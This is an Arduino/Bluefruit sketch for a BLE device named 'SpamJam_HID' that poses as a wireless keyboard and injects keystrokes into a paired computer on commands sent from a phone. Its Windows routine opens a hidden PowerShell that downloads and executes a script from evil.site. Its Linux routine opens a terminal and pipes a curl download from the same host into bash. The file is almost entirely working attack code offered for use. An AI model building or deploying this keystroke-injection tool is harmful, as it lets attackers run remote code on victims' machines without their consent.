#include <Arduino.h>
#include <bluefruit.h>
#include "Adafruit_TinyUSB.h"

BLEDis         bledis;
BLEHidAdafruit blehid;
BLEUart        bleuart;

// Tracks which connection is the HID injection target
uint16_t hid_conn_hdl = BLE_CONN_HANDLE_INVALID;

// Forward declarations
void connect_callback(uint16_t conn_hdl);
void disconnect_callback(uint16_t conn_hdl, uint8_t reason);
void uart_rx_callback(uint16_t conn_hdl);
void typeText(uint16_t conn_hdl, const char* str);
void fireWindows(uint16_t conn_hdl);
void fireLinux(uint16_t conn_hdl);
void firePoc(uint16_t conn_hdl);

void setup() {
  Serial.begin(115200);
  // No while(!Serial) -- device runs on battery, no USB host needed

  Bluefruit.begin(2, 0); // 2 peripheral connections: HID target + phone controller
  Bluefruit.setTxPower(4);
  Bluefruit.setName("SpamJam_HID");
  Bluefruit.Periph.setConnectCallback(connect_callback);
  Bluefruit.Periph.setDisconnectCallback(disconnect_callback);

  bledis.setManufacturer("Spam Jam Inc.");
  bledis.setModel("SJ-BLE-Key");
  bledis.begin();

  blehid.begin();

  bleuart.begin();
  bleuart.setRxCallback(uart_rx_callback);

  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
  Bluefruit.Advertising.addTxPower();
  Bluefruit.Advertising.addAppearance(BLE_APPEARANCE_HID_KEYBOARD);
  Bluefruit.Advertising.addService(blehid);
  Bluefruit.Advertising.addService(bleuart);
  Bluefruit.Advertising.addName();

  Bluefruit.Advertising.start();

  Serial.println("SpamJam ready. Advertising as SpamJam_HID");
  Serial.println("Connect target device first, then phone via nRF Connect");
}

void loop() {
  // All work is done in callbacks
}

void connect_callback(uint16_t conn_hdl) {
  Serial.print("Connected handle: ");
  Serial.println(conn_hdl);

  // First connection becomes the HID injection target
  if (hid_conn_hdl == BLE_CONN_HANDLE_INVALID) {
    hid_conn_hdl = conn_hdl;
    Serial.println("-> Set as HID target");
  } else {
    Serial.println("-> Set as controller (use nRF Connect UART)");
    // Send welcome banner to the controller
    const char* banner = "\nSpamJam_HID ready\nCommands: w  l  p  s\n"
                         "  w / windows  - Windows payload\n"
                         "  l / linux    - Linux payload\n"
                         "  p / poc      - Hello test\n"
                         "  s / status   - Connection info\n\n";
    bleuart.write(conn_hdl, (uint8_t*)banner, strlen(banner));
  }
}

void disconnect_callback(uint16_t conn_hdl, uint8_t reason) {
  Serial.print("Disconnected handle: ");
  Serial.println(conn_hdl);

  if (conn_hdl == hid_conn_hdl) {
    hid_conn_hdl = BLE_CONN_HANDLE_INVALID;
    Serial.println("-> HID target cleared");
  }
}

void uart_rx_callback(uint16_t conn_hdl) {
  char buf[64] = {0};
  int len = bleuart.read((uint8_t*)buf, sizeof(buf) - 1);

  // Strip trailing CR/LF
  for (int i = 0; i < len; i++) {
    if (buf[i] == '\r' || buf[i] == '\n') { buf[i] = 0; break; }
  }

  if (strlen(buf) == 0) return;

  Serial.print("CMD: "); Serial.println(buf);

  bool has_target = (hid_conn_hdl != BLE_CONN_HANDLE_INVALID);

  if (strcmp(buf, "w") == 0 || strcmp(buf, "windows") == 0) {
    if (has_target) {
      bleuart.write(conn_hdl, (uint8_t*)"[*] Firing Windows payload...\n", 30);
      fireWindows(hid_conn_hdl);
      bleuart.write(conn_hdl, (uint8_t*)"[+] Done\n", 9);
    } else {
      bleuart.write(conn_hdl, (uint8_t*)"[-] No HID target connected\n", 28);
    }

  } else if (strcmp(buf, "l") == 0 || strcmp(buf, "linux") == 0) {
    if (has_target) {
      bleuart.write(conn_hdl, (uint8_t*)"[*] Firing Linux payload...\n", 28);
      fireLinux(hid_conn_hdl);
      bleuart.write(conn_hdl, (uint8_t*)"[+] Done\n", 9);
    } else {
      bleuart.write(conn_hdl, (uint8_t*)"[-] No HID target connected\n", 28);
    }

  } else if (strcmp(buf, "p") == 0 || strcmp(buf, "poc") == 0) {
    if (has_target) {
      bleuart.write(conn_hdl, (uint8_t*)"[*] Firing PoC payload...\n", 26);
      firePoc(hid_conn_hdl);
      bleuart.write(conn_hdl, (uint8_t*)"[+] Done\n", 9);
    } else {
      bleuart.write(conn_hdl, (uint8_t*)"[-] No HID target connected\n", 28);
    }

  } else if (strcmp(buf, "s") == 0 || strcmp(buf, "status") == 0) {
    char resp[80];
    snprintf(resp, sizeof(resp),
      "HID target : %s (handle %d)\nConnections: %d/2\n",
      has_target ? "connected" : "none",
      hid_conn_hdl,
      Bluefruit.connected());
    bleuart.write(conn_hdl, (uint8_t*)resp, strlen(resp));

  } else {
    const char* help = "Unknown cmd. Try: w  l  p  s\n";
    bleuart.write(conn_hdl, (uint8_t*)help, strlen(help));
  }
}

void typeText(uint16_t conn_hdl, const char* str) {
  while (*str) {
    blehid.keyPress(conn_hdl, *str);
    delay(5);
    blehid.keyRelease(conn_hdl);
    delay(25);
    str++;
  }
}

void fireWindows(uint16_t conn_hdl) {
  delay(500);
  blehid.keyPress(conn_hdl, HID_KEY_GUI_LEFT);
  blehid.keyPress(conn_hdl, 'r');
  delay(300);
  blehid.keyRelease(conn_hdl);
  delay(300);

  typeText(conn_hdl, "cmd");
  blehid.keyPress(conn_hdl, HID_KEY_RETURN);
  delay(300);
  blehid.keyRelease(conn_hdl);
  delay(500);

  const char* payload = "powershell -WindowStyle hidden -command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.site/script.ps1')\"";
  typeText(conn_hdl, payload);
  blehid.keyPress(conn_hdl, HID_KEY_RETURN);
  delay(300);
  blehid.keyRelease(conn_hdl);
}

void fireLinux(uint16_t conn_hdl) {
  delay(500);
  blehid.keyPress(conn_hdl, HID_KEY_CONTROL_LEFT);
  blehid.keyPress(conn_hdl, HID_KEY_ALT_LEFT);
  blehid.keyPress(conn_hdl, 't');
  delay(300);
  blehid.keyRelease(conn_hdl);
  delay(800);

  const char* payload = "bash -c \"$(curl -fsSL http://evil.site/script.sh)\"";
  typeText(conn_hdl, payload);
  blehid.keyPress(conn_hdl, HID_KEY_RETURN);
  delay(300);
  blehid.keyRelease(conn_hdl);
}

void firePoc(uint16_t conn_hdl) {
  delay(500);
  blehid.keyPress(conn_hdl, HID_KEY_RETURN);
  delay(300);
  blehid.keyRelease(conn_hdl);
  delay(300);

  typeText(conn_hdl, "Hello from Spam Jam!");
  blehid.keyPress(conn_hdl, HID_KEY_RETURN);
  delay(300);
  blehid.keyRelease(conn_hdl);
}
